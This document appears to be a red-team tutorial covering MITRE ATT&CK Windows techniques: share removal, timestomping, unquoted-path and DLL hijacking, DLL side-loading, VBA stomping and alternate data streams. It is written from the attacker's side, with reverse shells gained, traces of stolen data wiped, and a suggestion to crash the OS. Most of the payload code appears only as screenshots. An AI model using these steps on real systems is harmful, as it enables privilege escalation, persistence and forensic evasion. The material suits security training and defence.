![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhno8pBL1q9246gu70%2F-MRhnvf7JE414gD9uG8Z%2Fimage.png?alt=media&token=4a0b479c-f34a-4e1f-9110-864f360e7140)

Sample

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhno8pBL1q9246gu70%2F-MRhnwZNMZpP_BpylcL-%2Fimage.png?alt=media&token=e9c236c4-64bd-4bbb-b5ea-6f07e5474e66)

And using cmd it will not move to Recycle Bin

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhno8pBL1q9246gu70%2F-MRhnxKNOavGW97hiNan%2Fimage.png?alt=media&token=7ba69055-a173-4443-9a22-5d008e3e08d1)

Of course this is just a very simple example we can use 3rd party tools to completely remove traces about our payload and can be harder to recover with the use of Forensic tools.

### network-share-connection-removal

Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and Windows Admin Shares connections can be removed when no longer needed. Net is an example utility that can be used to remove network share connections with the 

**net use \system\share /delete**

 command.

**Example:**

Adversaries can have the use of shares to move files, malware, or lateral move, they can also force authentication to capture hashes.

But in this sample let us see how an Adversary removes a share that contains malware and their Stolen Data.

In this scenario the Adversary gain access to Desktop-Alpha and has a share connected with Desktop-Bravo since this workstation contains all the goods, it is time to disconnect and remove it so that no traces are left back to our malware and sources

We use net to see our shares available in the compromised workstation

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhnxuLq8BKoB3J-2LY%2F-MRho4i72T1gMIdNeeSe%2Fimage.png?alt=media&token=a074252d-ad82-4c66-804f-11b8d45b1a55)

And we can see this in our GUI as well

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhnxuLq8BKoB3J-2LY%2F-MRho5ZqbsTECIFZWZQB%2Fimage.png?alt=media&token=b1e61d7e-de7b-426f-91cc-7d44279ea020)

Let's see our share what it has

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhnxuLq8BKoB3J-2LY%2F-MRho6PcOS9Zz4Q-b26R%2Fimage.png?alt=media&token=6c1e1aa7-e779-4534-b92d-2fb63cfb9c3d)

File Content

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhnxuLq8BKoB3J-2LY%2F-MRho7IEM5M8QUUogF9x%2Fimage.png?alt=media&token=55c80ab5-1c1f-49f7-a6c2-5d8f2fcd2e98)

Ok we have passwords let us remove the share so nobody else has access to this.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhnxuLq8BKoB3J-2LY%2F-MRho8HmwnCqVRE4VnVU%2Fimage.png?alt=media&token=8563f4f1-cef0-4ce5-9d84-7375337ae8e8)

So we have a Z: Drive connected and our goal was to remove this, once successful we no longer see the share connected.

### timestomping

Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.

Timestomping may be used along with file name Masquerading to hide malware and tools.

## untitled-5

Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.

There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.

### path-interception-by-unquoted-path

Adversaries may execute their ow malicious payloads by hijacking vulnerable path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.

Service paths and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., C:\unsafe path with space\program.exe vs. "C:\unsafe path with pace\program.exe"). (stored in Windows Registry Keys)An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is C:\program files\myapp.exe, an adversary may create a program at C:\program.exe that will be run instead of the intended program.

This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by higher privileged process.

**Example:**

A very popular and well known technique usually some software have very minor but important configurations missing for example Quoting ("") a full path of a file or binary, we are aware that Windows has some folders that contain spaces in them (C:\Program Files\) and these folders or paths without a quote windows sees them as an End Line where that is a termination of a file name, here is the reason why it's necessary to quote the path so windows sees it as a complete path when a space(" ") is in the path name.

It's important to have these quoted paths since windows will not find the assigned file or binary when doing its search when a service is started, in this situation an attacker can take advantage of this and add a malicious payload on a path that come's before the intended one.

A very great tool that I recently have found and its output is very clean is 

**PrivescCheck.**

The output is user friendly and it even has an Highlighted section at the end of its run that puts everything tidied up for you so you can find the vulnerability.

Sample:

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhZ3YHHB0SayS_cfGQ%2Fimage.png?alt=media&token=0168b3cc-906e-408a-a8f3-ecea261e10f2)

So let us pay attention to the Unquoted Path Result

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhZ4NOIn_9IESWVIsg%2Fimage.png?alt=media&token=e001c3e3-ad22-49ce-9d6e-73486c453985)

Look at this Ccleaner is Unquoted and it’s a Service where the Path is Modifiable but we see that the C:\ Path is WRTIE accessible. But unfortunately as a User we don't have permissions to Start or Restart so what best option do we have, well I wouldn't call these Ethical but we can probably Crash the OS and have a force reboot ONLY if it's not possible to Restart as a User. But here for the sake of Demonstration I will Restart it as the Administrator and have my Payload executed.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhZ59KnQkuIE-qzfN5%2Fimage.png?alt=media&token=37bf07cb-9353-4635-bf4a-c4245d871290)

### service-file-permissions-weakness

Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.

Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.

**Example:**

In this situation a user has PERMISSIONS to designate or modify one of the services run by SYSTEM in this situation we see a normal service already stopped, in this example its Ccleaner, also info on the BinPath that shows where the binary is located in the Windows System.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhZCa9uuvGts_bAsRX%2Fimage.png?alt=media&token=7b736ea1-bf89-4ed5-81e8-959e75f476db)

What if a User has permissions to change this binPath?, simple it can have it point to the malicious payload and when this services is started it will run the malicious payload.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhZDKx-CN1i181Xm2c%2Fimage.png?alt=media&token=97fe0137-fb56-41a0-b8fe-370cce449535)

Same Result but a more simpler configuration modification.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhZE6SCHGhjEXKDCKL%2Fimage.png?alt=media&token=1ca147da-b197-4e06-9a3b-2244b98b7c28)

### path-interception-by-search-order-hijacking

Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.

Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike DLL Search Order hijacking, the search order differs depending on the method that is used to execute the program. However, it is common for Windows to search in the directory of the initiating program before searching through the Windows System directory. An adversary who finds a program vulnerable to search order hijacking(i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.

For example, "example.exe" runs "cmd.exe" with the command-line argument net user. An adversary may place a program called "net.exe" within the same directory as example.exe, "net.exe" will be run instead of the Windows system utility net. In addition, if an adversary places a program called "net.com" in the same directory as "net.exe", then cmd.exe /C net users will execute "net.com" instead of "net.exe" due to the order of executable extensions defined under PATHEXT.

Search order hijacking is also common practice for hijacking DLL loads.

**Example:**

So in this example I created a simple C++ example.exe application which calls net.exe and uses the arguments 

**net users.**

This application is vulnerable to Search order Hijacking as since the program net.exe is not called with it's full path Windows is Searching for the program in its predetermined order that I have mentioned previously, take a look at the code:

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhYpduR8Vr-oTgM8LO%2Fimage.png?alt=media&token=3f932934-ff0b-4ee5-9e66-634e5a224b7a)

I will execute example.exe in a regular directory where there is no malicious hijacking.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhYqSMqAVFXzccbJ_M%2Fimage.png?alt=media&token=7f3b4ec8-3763-41aa-ba84-1c06a041fd87)

As you can see above the child processes from Example it called net.exe and windows found it in the %SystemRoot% Path.

So what happens when the program is called in a directory where there is a similar program named net.exe but it is actually our malicious payload?.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhYrP9Wb8NoHkYlq3D%2Fimage.png?alt=media&token=ea553c4f-7bcf-4b97-a716-6e27b3ac09c3)

We can see it found our malicious payload that executes calc.exe and it runs that one instead, since one of the first paths it usually takes before finding it in C:\Windows\System32 is the current working directory.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhYuO0WNJWkdu214MC%2Fimage.png?alt=media&token=a025b915-1ca5-4445-9b38-f295943d83aa)

Calc.exe is executed instead.

### path-interception-by-path-environment-variable

Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called form a script or the command line.

The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory %SystemRoot%\System32 (e.g.: C:\Windows\System32), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or python), which will be executed when that command is executed from a script or command-line.

For example, if C:\example Path precedes C:\Windows\System32 is in the PATH environment variable, a program that is named net.exe and placed in C:\example Path will be called instead of the Windows system "net" when "net" is executed from the command-line.

**Example:**

It's possible to abuse the %Path% variable environment variable to elevate privileges as long as the user has permissions to (W) Write and it comes 

**BEFORE**

 C:\Windows\System32.

By using the 

**set path=**

 we can set the path we have control of.

Let us check our PATH variable and see how it looks

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhYf_6QCOz303gDYui%2Fimage.png?alt=media&token=f65a877d-f796-4c15-84fc-dd557276fac0)

Ok so now I will add our malicious payload which in this case it's calc.exe replacing net.exe.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhYgM6F9qjB4XMGX5z%2Fimage.png?alt=media&token=97ff9d5f-95c1-4d74-af90-a26dcf208de5)

We add our new path and make sure this is before C:\Windows\System32.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhYhF7UTBGrrbNkR5m%2Fimage.png?alt=media&token=282db0ed-c1f0-4c6a-a228-0e077c85458b)

Perfect, now I will run net.exe regularly and Calc should prompt instead.

### executable-installer-file-permissions-weakness

Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under higher-level permissions, which could include SYSTEM.

Another variation if this technique can be performed by takin advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the %TEMP% directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of DLL Search Order Hijacking.

Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to Bypass User Account Control. Several examples of this weakness in existing common installers have been reported to software vendors. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.

**Example**

In this example I will demonstrate a simple install 7z1512.exe I will run Procmon in this situation and see what is going on when my Installer is executed.

I noticed that 7z Installer is looking for a DLL named TextShaping.dll and it is looking for it in the current working directory.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhXtIXC130hr_C_TbA%2Fimage.png?alt=media&token=c608695a-d6e6-47d4-8b52-00f598187c56)

I will take the same approach as previous DLL examples and try to add this DLL with the proper architecture of the program which in this case is 32-bit

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhXuLJSJjGHuAKS4QM%2Fimage.png?alt=media&token=b5344609-e9fa-47f1-a7e6-4feaa524e116)

We run the installer again but this time we are placing our payload named properly as the DLL that the installer is trying to load, in this case TextShaping

This time no more TextShaping location issues:

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhXv1hEd4xC3Nl5wRr%2Fimage.png?alt=media&token=36b619ff-23f0-42d0-9b91-6c31a7fce911)

And we receive a shell on our attacking machine.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhXvkw4X-RRFeSoGXt%2Fimage.png?alt=media&token=73f9bfd8-8c12-418c-b639-da630f6190d1)

Here I received Administrator Privileges on the machine as only Admins can install new software but of course there are many scenarios where we can actually gain user permissions if the user has specific permissions to install now programs on that machine as well. Remember that proper execution of the installer is not functional anymore and will seem suspicious that we can't install a program. We can take an approach of a Proxy DLL but that is something for another time, I demonstrate that technique in DLL Side Loading

### dll-side-loading

Adversaries may execute their own malicious payloads by hijacking the library manifest used to load DLLs.

Adversaries may take advantage of vague references in the library manifest of a program by replacing a legitimate library with malicious one, causing the operating system to load their malicious library when it is called for by the victim program.

Program may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests are not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable by replacing the legitimate DLL with a malicious one.

Adversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.

Windows, like many operating systems, allows applications to load DLLs at runtime. Applications can specify the location of DLLs to load by specifying the location of DLLs to load by specifying a full path, using DLL redirection, or by using a manifest. If none of these methods are used, Windows attempts to locate the DLL by searching a predefined set of directories in a set of order.

Example:

I will work on the Winamp Program again, this time I won't be replacing any DLL files to load my payload but here I will be tricking the Program into load my DLL payload, usually to achieve this we would need a .manifest file to be modified and to point to our payload but here we will modify a legit DLL and add a "proxy DLL" to execute our payload and send the legitimate calls to the legit DLL as well. So here execution wouldn't even fail!

First we will search for a proper DLL, according to the hints the smaller the better. I will use Procmon again as well and search for a proper file that has a SUCCESS Result.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhPCyZDqqN6DA2fjlF%2Fimage.png?alt=media&token=763d5683-eb28-4b6c-affc-fe09987ef66a)

My victim is the nsutil.dll, usually we want to target files that have user-land access but in these situations most likely you will encounter a situation where Administrator Privileges are required.

Will grab nsutil and place it on the same folder as our payload.dll file and have a work from this awesome tool DLLSideLoader.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhPDm2BN3MdJZwW3fo%2Fimage.png?alt=media&token=6df11685-acca-4928-a4c7-0f2b47dedf42)

Will Import the PS1 Script onto our PowerShell Session and run the following syntax, if everything runs correctly you should see something like this:

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhPEoGFek8VXwys9Xy%2Fimage.png?alt=media&token=0a8afb1b-14d6-41e7-ad2f-b122570543dc)

Something I had troubles when using this method is I wasn't paying attention to the architecture of the software, I was mainly building my payload for a 64 Bit PC as this was my targeted machine, but in this situation we are targeting the program not the OS.

Will grab all of these files (payloadx86.dll, nsutil.dll and tmp2D86.dll and replace them where our legitimate program is located.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhPFe3NeZXCvxqp7pB%2Fimage.png?alt=media&token=058f7b15-1674-43ce-895d-658c86452dc3)

Once winamp is executed the nsutil will call tmp and proxy the execution onto our payloadx86 and move back to the legitimate calls so our program won't crash but we will also receive our reverse shell. 

**(This is a Hit or Miss I managed to get it working sometimes and sometimes it wouldn't even open but will always receive a shell no matter the location of the binary as long as they were in the same location with the files)**

Or we can also execute without having all of this replaced they can run in the same folder as long as these files are all together (remember dll hijacking the order it follows)

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhPGVTR6b6XxSuVIED%2Fimage.png?alt=media&token=34d6444a-0ee4-42aa-aa5d-d9f98bc28ac7)

The same result for both situations.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhPJxs6d61Hz4UcHGn%2Fimage.png?alt=media&token=b8027206-a7a7-4032-867d-4b314730e5ef)

##################################################################################################

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhPIgRNZCCMbu6diuB%2Fimage.png?alt=media&token=95ede75a-9be1-40c6-a46f-2fd2ffc35064)

References:

​

### dll-search-order-hijacking

Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program, Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.

There are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL.

Adversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL.

If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.

Let us see some examples:

In Windows Environments when an application or a service is starting it looks for a number of DLL's in order to function properly. If these DLL's doesn't exist or are implemented in an insecure way (DLL's are called without using a fully qualified path) then it is possible to escalate privileges by forcing the application to load and execute a malicious DLL File.

It should be noted that when an application needs to load a DLL it will go through the following order:

· The directory which the application is loaded.

· C:\Windows\System32

· C:\Windows\System

· C:\Windows

· The current working directory

· Directories in the system PATH environment variable

· Directories in the user PATH environment variable

A fast way to Hijack and Find any DLL Hijacking is using PowerSploits, Find-PathDLLHijack, Find-ProcessDLLHijack, Invoke-AllChecks. We can check that powersploit will tell us where the hijack is located and what command to use next to hijack the process immediately.

We will work with Administrator Privileges in this example, not completely necessary if you can find a user with misconfiguration permission where they are allowed to WRITE, crazy right!!?, who would do that!!?

**Procmon**

For this technique I will use Procmon, as this is a great toll to view what a program is loading at run time, there are also other great tools from PowerSploit that will verify this Vulnerability, other tools such as SharpUp from GhostPack it is a tool written in C#.

Our Process in this sample is Winamp.

Winamp is a media player for Microsoft Windows it was a very popular and widely used media player back in the early 2000's, in the version we are currently working on it contains a DLL Hijack vulnerability as it is trying to load many different DLL files inexistent in its current directory, we can verify this with Procmon.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhOx_LcpwKDXFX9kij%2Fimage.png?alt=media&token=e03ccba8-2142-46e0-bedb-12f07bbb4138)

Wow, many potential hijacks, so our next step is to choose a DLL we wish to hijack, I will use the DLL . I will use a DLL this time to receive a reverse shell. My focus will be on vcruntime140d.dll

What happens when the program cannot find the DLL, it start following an order to locate the DLL

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhOyxBy-dbQi0p9O-0%2Fimage.png?alt=media&token=c506d436-f671-4f8f-93a3-c9996fb8f2e9)

Let us take a look and see what happens if I rename it, how will the order continue.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhOzx0oN5aaCokeBAT%2Fimage.png?alt=media&token=a8e9a440-464b-4955-a0c8-2b6e3fde534f)

Now I will add this DLL to any of the other paths that are seen above see if it loads it and gives me a shell.

Once added:

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhP-wb38i6CkvFoAKx%2Fimage.png?alt=media&token=495e2e46-fff8-4832-9a1e-135d0a4fa8cd)

We can simply start the process and check the results

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhP1LQ1ocbxd9bW3pF%2Fimage.png?alt=media&token=718c142b-ab18-4818-ad58-b0f9f61ede90)

And this time it did find it.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhP3HN1xpXhElGqYbl%2Fimage.png?alt=media&token=499d23bc-f79b-42db-85cd-4936ae059540)

References:

​

## t1564-hide-artifacts

Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.

Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.

### vba-stomping

Adversaries may hide malicious Visual Basic Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.

MS Office documents with embedded VBA Content store source code inside of module streams. Each module stream has a PerformanceCache that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the _VBA_PROJECT stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.

An adversary  may hide malicious VBA code by overwriting the VBA source code location with zero's, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the _VBA_PROJECT stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.

** VBA Macros Advanced**

**Evil Clippy**

Evil Clippy a tool released in BlackHat Asia in 2019 it is a a maldoc assistant which help's red teams to bypass popular AV and get an initial foothold, in this category we will focus on the 

**VBA Stomping**

 technique. Discovered years ago by Dr. Vesselin Bontchev (

[here](https://github.com/bontchev/pcodedmp)

). At a high level explanation of this attack by creating a malicious document we can actually add a non-malicious macro into the source code of the file, as explained by Dr. Bontchev what actually executes is the p-code stored in the document as long as it's compatible with the current VBA version.

Let's work with some samples a Non-malicious Macro is created. A message box is to be displayed when the document is opened.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhmk4n0GjkLPwi_qrv%2F-MRhmt8Uptkx73uFx0yU%2Fimage.png?alt=media&token=51cb92b3-1300-4d9d-8138-b26b2e839976)

Now from here we want to modify the VBA source code utilized while leaving the p-code unchanged. To edit this file you will unzip it and edit the vbaProject.bin file using a hex editor, but only withing the VBA source code storage location, not the p-code section.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhmk4n0GjkLPwi_qrv%2F-MRhmsPmtb-KTDTQfsfu%2Fimage.png?alt=media&token=54584a8d-d2ec-458d-b270-1ca508ada3d5)

Now that the VBA source code has been manually edited we will open the document and inspect the VBA Code BEFORE the "Enable Content" button is clicked.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhmk4n0GjkLPwi_qrv%2F-MRhmue54tIXhPTjLc-3%2Fimage.png?alt=media&token=3253b6eb-305b-43f5-a054-d60acea0fb1e)

We see here that the source-code still displays XYZ but in fact once the content is enabled we see a message box displaying "ABC"

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhmk4n0GjkLPwi_qrv%2F-MRhmvSQxlfIfjYQe6ju%2Fimage.png?alt=media&token=b0a557b2-6796-4ef9-9ec0-24b46d685197)

Well what happened here?. Our source code stated that XYZ was going to be executed but instead ABC was displayed and later on our Code updated to match the execution.

References:

VBA Stomping — Advanced Maldoc Techniques

Medium

​

### run-virtual-instance

Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code indie of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.

Adversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.

**I have zero idea how to replicate this here is a reference**

The ransomware that attacks you from inside a virtual machine

Naked Security

### ntfs-file-attributes

Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. Within MFT entries are file attributes, such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files).

Adversaries may store malicious data or binaries in the file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus.

**Example:**

Alternate Data Stream is an Artifact of New Technology File Systems (NTFS) which was introduced by Windows. Attackers introduced a method where they managed to hide payloads, malware, keyloggers and have them execute without the knowledge of the users.

A file can have more than one Alternate Data Stream for the various purpose to hold metadata of the file. When you append an ADS File with a default stream file, there will be no change made to the size or the function of the file.

Here, we are making use of .txt file as our primary stream to demonstrate ADS, you can use any file of your preference.

We create a file and add content.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhlRkHzsAnfsJcE_55%2F-MRhmCGasdnhm3HYOBOs%2Fimage.png?alt=media&token=711d9a49-c2e4-4be8-80b0-3635d1f5129f)

To display The contents in the folder including Alternate Data Stream we use 

** dir /r**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhlRkHzsAnfsJcE_55%2F-MRhmD7l3zdQtymCwaal%2Fimage.png?alt=media&token=78011abb-c5e3-4ae3-b90f-7be943cca53e)

]

In the above image, you can see that there is no hidden file displayed, and on the GUI you see that there is only 1 file.

